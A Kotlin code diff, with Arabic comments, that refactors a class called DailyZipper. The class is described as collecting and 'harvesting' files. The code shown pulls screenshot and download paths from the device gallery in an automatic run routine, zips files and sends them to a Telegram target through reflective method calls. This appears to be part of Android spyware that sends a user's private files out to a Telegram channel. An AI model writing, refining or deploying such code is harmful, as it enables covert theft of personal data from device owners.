@@ -23,6 +23,17 @@ import java.util.concurrent.atomic.AtomicBoolean
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
+// ===== دوال مساعدة على مستوى الملف (top-level) لتجنب أي تعارض =====
+private fun getBooleanFromMap(obj: Any?, key: String): Boolean {
+    val map = obj as? Map<*, *> ?: return false
+    return map.get(key) as? Boolean ?: false
+}
+
+private fun getStringFromMap(obj: Any?, key: String): String {
+    val map = obj as? Map<*, *> ?: return ""
+    return map.get(key)?.toString() ?: ""
+}
+
 /**
  * فئة تجميع الملفات وحصادها - خالية تماماً من أي تعارض مع التعبيرات النمطية
  */
@@ -266,8 +277,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram - بدون دوال مساعدة خارجية
-    //  استخدام map.get() بدلاً من map[]
+    //  إرسال الملفات إلى Telegram - باستخدام الدوال المساعدة
     // ============================================================
 
     private suspend fun safeSend(
@@ -302,16 +312,9 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // استخراج القيمة باستخدام map.get() بدلاً من map[]
                 val success = when (result) {
                     is Boolean -> result
-                    is Map<*, *> -> {
-                        @Suppress("UNCHECKED_CAST")
-                        val map = result as? Map<String, Any?>
-                        val okValue = map?.get("ok")
-                        okValue is Boolean && okValue
-                    }
-                    else -> false
+                    else -> getBooleanFromMap(result, "ok")
                 }
 
                 if (success) {
@@ -619,7 +622,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - بدون دوال مساعدة، باستخدام map.get()
+    //  التشغيل التلقائي - باستخدام الدوال المساعدة
     // ============================================================
 
     fun run(): Boolean {
@@ -640,15 +643,7 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // استخراج المسار باستخدام map.get()
-                            val path = if (item is Map<*, *>) {
-                                @Suppress("UNCHECKED_CAST")
-                                val map = item as? Map<String, Any?>
-                                val value = map?.get("path")
-                                value?.toString() ?: ""
-                            } else {
-                                ""
-                            }
+                            val path = getStringFromMap(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
@@ -741,7 +736,6 @@ class DailyZipper(
             method.isAccessible = true
             method.invoke(target, *args)
         } catch (e: Exception) {
-            // محاولة بديلة باستخدام الأنواع
             invokeMethodFallback(target, methodName, *args)
         }
     }
